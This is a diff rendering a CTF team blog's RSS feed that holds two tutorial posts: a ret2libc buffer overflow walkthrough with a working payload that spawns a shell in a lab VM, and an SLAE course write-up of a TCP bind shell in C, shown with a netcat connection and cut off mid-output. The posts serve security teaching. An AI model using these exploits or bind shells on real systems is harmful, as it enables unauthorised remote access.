@@ -1,22 +1,2105 @@
----
-layout: null
----
-
 <?xml version="1.0" encoding="UTF-8"?>
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
 	<channel>
-		<title>{{ site.name }}</title>
-		<description>{{ site.description }}</description>
-		<link>{{site.baseurl | prepend:site.url}}</link>
-		<atom:link href="{{site.baseurl | prepend:site.url}}/feed.xml" rel="self" type="application/rss+xml" />
-		{% for post in site.posts limit:10 %}
+		<title>Bad Hombre's Blog</title>
+		<description>Hombres CTF Team / General Bad Asses</description>
+		<link>https://bad-hombres.github.io//blog</link>
+		<atom:link href="https://bad-hombres.github.io//blog/feed.xml" rel="self" type="application/rss+xml" />
+		
 			<item>
-				<title>{{ post.title }}</title>
-				<description>{{ post.content | xml_escape }}</description>
-				<pubDate>{{ post.date | date: "%a, %d %b %Y %H:%M:%S %z" }}</pubDate>
-				<link>{{post.url | prepend:site.baseurl | prepend:site.url}}</link>
-				<guid isPermaLink="true">{{post.url | prepend:site.baseurl | prepend:site.url}}</guid>
+				<title>Buffer Overflows: Level 2 (ret2libc)</title>
+				<description>&lt;h1 id=&quot;moving-forward&quot;&gt;Moving forward&lt;/h1&gt;
+&lt;p&gt;Following on from Level 1 where there were no protections in place we now
+advance to a place where compiler makers got annoyed with people smashing the
+stack and they said “hey lets make the stack not executable!!”. Makes sense
+right if the stack is not executable then hackers cant put code there and then
+execute it.&lt;/p&gt;
+
+&lt;p&gt;The concept of ret2libc is as the name suggests, if we cant execute shellcode on
+the stack we just have to force the program to return to somewhere that is
+executable and in most binaries that will be the program itself or trusty libc.&lt;/p&gt;
+
+&lt;h1 id=&quot;show-me-the-money&quot;&gt;Show me the money!&lt;/h1&gt;
+&lt;p&gt;Right below is a vulnerable C program. (follow along by using the vagrant file I
+supplied in my post about vagrant) Its the same program used in level 1&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;stdio.h&amp;gt;
+#include &amp;lt;unistd.h&amp;gt;
+&lt;/span&gt;
+&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[])&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+  &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;strcpy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;puts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Lets compile and run&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;vagrant@precise32:/vagrant$ gcc -fno-stack-protector -o vuln2 vuln.c
+vagrant@precise32:/vagrant$ ./vuln2 AAAA
+AAAA
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;Good all working, notice we have turned off stack protection (stack canaries)
+and the stack is now not executable. There is one other protection we want to
+disable which is ASLR&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;vagrant@precise32:/vagrant$ sudo bash -c &quot;echo 0 &amp;gt; /proc/sys/kernel/randomize_va_space&quot;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;In this post we are also going to do this without a debugger just for giggles.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;vagrant@precise32:/vagrant$ readelf -l ./vuln2
+
+Elf file type is EXEC (Executable file)
+Entry point 0x8048360
+There are 9 program headers, starting at offset 52
+
+Program Headers:
+  Type           Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align
+  PHDR           0x000034 0x08048034 0x08048034 0x00120 0x00120 R E 0x4
+  INTERP         0x000154 0x08048154 0x08048154 0x00013 0x00013 R   0x1
+      [Requesting program interpreter: /lib/ld-linux.so.2]
+  LOAD           0x000000 0x08048000 0x08048000 0x0061c 0x0061c R E 0x1000
+  LOAD           0x000f14 0x08049f14 0x08049f14 0x00104 0x0010c RW  0x1000
+  DYNAMIC        0x000f28 0x08049f28 0x08049f28 0x000c8 0x000c8 RW  0x4
+  NOTE           0x000168 0x08048168 0x08048168 0x00044 0x00044 R   0x4
+  GNU_EH_FRAME   0x000524 0x08048524 0x08048524 0x00034 0x00034 R   0x4
+  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RW  0x4
+  GNU_RELRO      0x000f14 0x08049f14 0x08049f14 0x000ec 0x000ec R   0x1
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;As you can see from the output above our stack is no longer executable (the RW
+on the GNU_STACK section)&lt;/p&gt;
+
+&lt;h1 id=&quot;finding-the-offset&quot;&gt;Finding the offset&lt;/h1&gt;
+&lt;p&gt;Ok so now we need to find the point in our buffer at which we begin to overwrite
+the return address. This is easy with a debugger and the use of patterns (as
+seen in level1) but how would we do this without a debugger? The answer is a
+binary search type algothrim which goes like this.&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;Find input that crashes the program&lt;/li&gt;
+  &lt;li&gt;Reduce the size of the input&lt;/li&gt;
+  &lt;li&gt;If the program no longer crashes then choose a buffer length in the middle of
+the two numbers&lt;/li&gt;
+  &lt;li&gt;Rinse and repeat until you have reached a bugger length where adding 1 byte
+crashes the program&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;See this process in action below&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;vagrant@precise32:/vagrant$ ./vuln2 $(python -c 'print &quot;A&quot;*100')
+��
+Segmentation fault
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;Crashes to lets drop to 60&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;vagrant@precise32:/vagrant$  ./vuln2 $(python -c 'print &quot;A&quot;*60')
+��
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;This no longer crashes so we’ll try 80&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;vagrant@precise32:/vagrant$ ./vuln2 $(python -c 'print &quot;A&quot;*80')
+��
+Segmentation fault
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;Ok so 80 crashes so its somewhere between 60 and 80 so lets try 70&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;vagrant@precise32:/vagrant$  ./vuln2 $(python -c 'print &quot;A&quot;*70')
+��
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;70 doesnt crash it so 75?&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;vagrant@precise32:/vagrant$ ./vuln2 $(python -c 'print &quot;A&quot;*75')
+��
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;Nope 77 maybe??&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;vagrant@precise32:/vagrant$ ./vuln2 $(python -c 'print &quot;A&quot;*77')
+��
+Segmentation fault
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;Ok crashes so now if 76 doesnt crash the program then this is the buffer length&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;vagrant@precise32:/vagrant$ ./vuln2 $(python -c 'print &quot;A&quot;*76') 
+��
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;Ok the program doesnt crash (it doesnt exit either) so 76 is our offset (spoiler
+its exactly the same as level one!! I know you’re shoked right!)&lt;/p&gt;
+
+&lt;h1 id=&quot;plan-of-attack&quot;&gt;Plan of attack&lt;/h1&gt;
+&lt;p&gt;So we cant run code on the stack and we are not using a debugger so here is what
+we are going to do.&lt;/p&gt;
+
+&lt;p&gt;We are going to overflow the return address to return to system and execute
+/bin/sh. In order to do this we need to create a fake stack. Lets remind
+ourselves how this looks.&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ebp
+return address
+args
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;We want our shell to exit cleanly so we will return to exit of the system call.
+System also requires on argument, the address of a string containing the command
+we want to run. Our Payload will now look as follows&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;76 * &quot;A&quot; + address of system + address of exit + address of /bin/sh
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;The address of exit is used as the return address after the system call and the
+address of /bin/sh is used as the argument to system&lt;/p&gt;
+
+&lt;h1 id=&quot;gathering-data&quot;&gt;Gathering data&lt;/h1&gt;
+
+&lt;h2 id=&quot;libc-base-address&quot;&gt;Libc base address&lt;/h2&gt;
+&lt;p&gt;This one is fairly easy just use the LD_TRACE_LOADED_OBJECTS env var when
+running the binary&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;vagrant@precise32:/vagrant$ LD_TRACE_LOADED_OBJECTS=1 ./vuln2 AAAAAA
+	linux-gate.so.1 =&amp;gt;  (0xb7fdd000)
+	libc.so.6 =&amp;gt; /lib/i386-linux-gnu/libc.so.6 (0xb7e29000)
+	/lib/ld-linux.so.2 (0xb7fde000)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;The address &lt;code class=&quot;highlighter-rouge&quot;&gt;0xb7e29000&lt;/code&gt; next to the libc line is the base address&lt;/p&gt;
+
+&lt;h2 id=&quot;address-of-system--exit&quot;&gt;Address of system + exit&lt;/h2&gt;
+&lt;p&gt;For this one we will use the readelf tool on the libc binary and grep for the
+requiored symbols&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;vagrant@precise32:/vagrant$ readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system
+   239: 001202b0    73 FUNC    GLOBAL DEFAULT   12 svcerr_systemerr@@GLIBC_2.0
+   615: 0003f0b0   141 FUNC    GLOBAL DEFAULT   12 __libc_system@@GLIBC_PRIVATE
+  1422: 0003f0b0   141 FUNC    WEAK   DEFAULT   12 system@@GLIBC_2.0
+vagrant@precise32:/vagrant$ readelf -s /lib/i386-linux-gnu/libc.so.6 | grep exit
+   109: 00033000    58 FUNC    GLOBAL DEFAULT   12 __cxa_at_quick_exit@@GLIBC_2.10
+   136: 00032bf0    45 FUNC    GLOBAL DEFAULT   12 exit@@GLIBC_2.0
+   549: 000baf68    24 FUNC    GLOBAL DEFAULT   12 _exit@@GLIBC_2.0
+   604: 001234b0    68 FUNC    GLOBAL DEFAULT   12 svc_exit@@GLIBC_2.0
+   640: 00032fd0    45 FUNC    GLOBAL DEFAULT   12 quick_exit@@GLIBC_2.10
+   856: 00032e30    58 FUNC    GLOBAL DEFAULT   12 __cxa_atexit@@GLIBC_2.1.3
+  1024: 0012d6d0    60 FUNC    GLOBAL DEFAULT   12 atexit@GLIBC_2.0
+  1359: 001a8224     4 OBJECT  GLOBAL DEFAULT   31 argp_err_exit_status@@GLIBC_2.1
+  1471: 000ff1f0    67 FUNC    GLOBAL DEFAULT   12 pthread_exit@@GLIBC_2.0
+  2058: 001a815c     4 OBJECT  GLOBAL DEFAULT   31 obstack_exit_failure@@GLIBC_2.0
+  2208: 00032c20    77 FUNC    WEAK   DEFAULT   12 on_exit@@GLIBC_2.0
+  2349: 00104900     2 FUNC    GLOBAL DEFAULT   12 __cyg_profile_func_exit@@GLIBC_2.2
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;So offset for system is &lt;code class=&quot;highlighter-rouge&quot;&gt;0x3f0b0&lt;/code&gt; and exit is &lt;code class=&quot;highlighter-rouge&quot;&gt;0x32bf0&lt;/code&gt;. A little bit of quick
+maths (adding to libc base) gives us &lt;code class=&quot;highlighter-rouge&quot;&gt;0xb7e680b0&lt;/code&gt; for system and &lt;code class=&quot;highlighter-rouge&quot;&gt;0xb7e5bbf0&lt;/code&gt; for
+exit&lt;/p&gt;
+
+&lt;h2 id=&quot;binsh&quot;&gt;/bin/sh&lt;/h2&gt;
+&lt;p&gt;To find this we will use the strings utility on the libc binary&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;vagrant@precise32:/vagrant$ strings -atx /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh
+ 1636a0 /bin/sh
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;The -a flag searches all the binary the -t flag tells strings to print offsets
+and the x arg to the t flags specifies hex format. Adding this to libc base
+gives &lt;code class=&quot;highlighter-rouge&quot;&gt;0xb7f8c6a0&lt;/code&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;putting-it-alltogether&quot;&gt;Putting it alltogether&lt;/h1&gt;
+&lt;p&gt;So with this information we now have our payload looks like&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;vagrant@precise32:/vagrant$ ./vuln2 $(python -c 'print &quot;A&quot; * 76 + &quot;\xb0\x80\xe6\xb7&quot; + &quot;\xf0\xbb\xe5\xb7&quot; + &quot;\xa0\xc6\xf8\xb7&quot;')
+��
+$ id
+uid=1000(vagrant) gid=1000(vagrant) groups=1000(vagrant),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),109(lpadmin),110(sambashare)
+$ exit
+vagrant@precise32:/vagrant$
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;As you can see above we dropped into a shell and when we exited it exited
+cleanly so no coredumps etc are left around&lt;/p&gt;
+
+&lt;h1 id=&quot;what-now&quot;&gt;What Now!!&lt;/h1&gt;
+&lt;p&gt;Go ahead and do this on your own and practice!!!!&lt;/p&gt;
+</description>
+				<pubDate>Thu, 01 Nov 2018 01:00:00 +0000</pubDate>
+				<link>https://bad-hombres.github.io//blog/2018/11/01/Buffer-Overflow-Level-2.html</link>
+				<guid isPermaLink="true">https://bad-hombres.github.io//blog/2018/11/01/Buffer-Overflow-Level-2.html</guid>
 			</item>
-		{% endfor %}
+		
+			<item>
+				<title>SLAE: TCP Bind Shell</title>
+				<description>&lt;h1 id=&quot;slae&quot;&gt;SLAE&lt;/h1&gt;
+&lt;p&gt;The SecurityTube Linux Assembly Expert is a course and certification from the
+folks over at http://www.securitytube-training.com and also available on
+http://www.pentesteracademey.com.&lt;/p&gt;
+
+&lt;p&gt;This blog post is the first post required for the exam requirements. My student
+id is: PA-4897 and the github url to my repo is https://github.com/mwest67/slae.&lt;/p&gt;
+
+&lt;h1 id=&quot;getting-started&quot;&gt;Getting started&lt;/h1&gt;
+&lt;p&gt;Our first task is to create a tcp bind shell in shellcode. In order to do this
+lets first understand what a bind shell is. Simply put a bind shell listens for
+a network connection on a particular port and when a connection is made it then
+redirects the programs STDIN, STDOUT and STDERR to the new connection, it then
+calls execve to replace the current process with a shell (usually /bin/sh). The
+client is then free to interact with the shell&lt;/p&gt;
+
+&lt;p&gt;Right, now we know what we want to achieve lets get started first thing first
+lets list all the syscalls we are going to need in order to achieve this task&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://linux.die.net/man/7/socket&quot; title=&quot;Socket Man page docs&quot;&gt;socket&lt;/a&gt;  - This is needed to create the listening socket&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://linux.die.net/man/7/bind&quot; title=&quot;bind Man page docs&quot;&gt;bind&lt;/a&gt;     - This is so we can tell the OS where to listen&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://linux.die.net/man/7/listen&quot; title=&quot;listen Man page docs&quot;&gt;listen&lt;/a&gt; - This is required to start the socket listening for
+                    connections&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://linux.die.net/man/7/accept&quot; title=&quot;accept Man page docs&quot;&gt;accept&lt;/a&gt; - This is to accept incoming connections&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://linux.die.net/man/7/dup2&quot; title=&quot;dup2 Man page docs&quot;&gt;dup2&lt;/a&gt;     - This is so we can redirect STDIN, OUT and ERR&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://linux.die.net/man/7/execve&quot; title=&quot;execve Man page docs&quot;&gt;execve&lt;/a&gt; - This is so we can spawn the shell&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h1 id=&quot;initial-version&quot;&gt;Initial Version&lt;/h1&gt;
+&lt;p&gt;Before we break out the assembler, let make sure we are good with achieving this
+in a higher level language like C&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;stdio.h&amp;gt;
+#include &amp;lt;sys/types.h&amp;gt;
+#include &amp;lt;sys/socket.h&amp;gt;
+#include &amp;lt;linux/socket.h&amp;gt;
+#include &amp;lt;arpa/inet.h&amp;gt;
+#include &amp;lt;unistd.h&amp;gt;
+#include &amp;lt;stdlib.h&amp;gt;
+&lt;/span&gt;
+&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;cm&quot;&gt;/* Initialize some variables */&lt;/span&gt;
+        &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sockfd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;clientfd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+        &lt;span class=&quot;cm&quot;&gt;/* Initialize the socket */&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;sockfd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;AF_INET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SOCK_STREAM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+        &lt;span class=&quot;cm&quot;&gt;/* Set up the params for the server socket */&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sockaddr_in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;server_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;server_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sin_family&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;AF_INET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;server_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sin_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;htonl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;INADDR_ANY&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;server_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sin_port&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;htons&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;5000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/* htons to convert to network byte order */&lt;/span&gt;
+
+        &lt;span class=&quot;cm&quot;&gt;/* Bind to the address we gave it */&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;bind&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sockfd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sockaddr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;server_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;server_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
+
+        &lt;span class=&quot;cm&quot;&gt;/* tell the server to listen */&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;listen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sockfd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+        &lt;span class=&quot;cm&quot;&gt;/*
+         * We should now start accepting client connections
+         * the NULLS are because we dont care who is connecting
+         * if we did we would need a pointer to a fresh sockaddr_in
+         * struct for the accept call to fill in
+         */&lt;/span&gt;
+
+        &lt;span class=&quot;n&quot;&gt;clientfd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;accept&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sockfd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sockaddr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+        &lt;span class=&quot;cm&quot;&gt;/* Redirect STDIN(0), STDOUT(1) and STDERR(2) to the client socket */&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;dup2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;clientfd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;dup2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;clientfd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;dup2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;clientfd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+        &lt;span class=&quot;cm&quot;&gt;/* execute the shell */&lt;/span&gt;
+        &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/bin/bash&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;execve&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Lets compile and run&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  $ gcc -m32 -o bind_shell bind_shell.c
+  $ ./bind_shell
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;And now from another shell&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  $ nc localhost 5000
+  ls
+  bind
+  bind.o
+  bind_shell
+  bind_shell.c
+
